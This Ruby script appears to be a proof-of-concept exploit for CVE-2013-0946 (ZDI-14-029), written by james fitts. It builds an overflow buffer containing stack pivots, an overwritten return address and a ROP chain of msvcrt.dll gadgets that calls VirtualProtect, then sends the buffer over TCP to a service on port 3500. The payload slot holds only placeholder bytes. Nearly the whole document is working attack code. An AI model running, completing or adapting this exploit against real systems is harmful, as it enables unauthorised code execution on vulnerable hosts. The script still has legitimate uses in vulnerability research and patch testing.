#! /usr/bin/env ruby
$LOAD_PATH << '~/code/msf4/lib'

# ZDI-14-029
# CVE-2013-0946
# james fitts

require 'rex'
require 'socket'

ip = '192.168.1.6'
port = 3500

# msvcrt.dll
# 96 bytes
rop = [
	0x77bb2563,     # pop eax/ retn
	0x77ba1114,     # ptr to kernel32!virtualprotect
	0x77bbf244,     # mov eax, dword ptr [eax]/ pop ebp/ retn
	0xfeedface,
	0x77bb0c86,     # xchg eax, esi/ retn
	0x77bc9801,     # pop ebp/ retn
	0x77be2265,
	0x77bb2563,     # pop eax/ retn
	0x03C0990F,
	0x77bdd441,     # sub eax, 3c0940fh/ retn
	0x77bb48d3,     # pop eax/ retn
	0x77bf21e0,
	0x77bbf102,     # xchg eax, ebx/ add byte ptr [eax], al/ retn
	0x77bbfc02,     # pop ecx/ retn
	0x77bef001,
	0x77bd8c04,     # pop edi/ retn
	0x77bd8c05,
	0x77bb2563,     # pop eax/ retn
	0x03c0984f,
	0x77bdd441,     # sub eax, 3c0940fh/ retn
	0x77bb8285,     # xchg eax, edx/ retn
	0x77bb2563,     # pop eax/ retn
	0x90909090,
	0x77be6591,     # pushad/ add al, 0efh/ retn
].flatten.pack("V*")

buf = Rex::Text.pattern_create(514)

# Opcode 0x4f
buf[0, 2] = "O~"

# stack pivot 52
# add esp, 30/ pop edx/ retn
buf[13, 4] = [0x77bdf444].pack('V')

# EIP
# stack pivot 12
# add esp, 0c/ retn
buf[25, 4] = [0x77bdda70].pack('V')

# stack pivot 52
# add esp, 30/ pop edx/ retn
buf[41, 4] = [0x77bdf444].pack('V')

# ptr
buf[57, 4] = [0x01167e20].pack('V')

buf[69, rop.length] = rop
buf[165, 50] = "\x41" * 50

# ptr
buf[278, 4] = [0x0116fd59].pack('V')
buf[512, 1] = "\x00"

buf << "AAAA"
buf << "BBBB"
buf << "CCCC"
buf << "DDDD"

s = TCPSocket.new(ip, port)
s.puts buf
s.close()
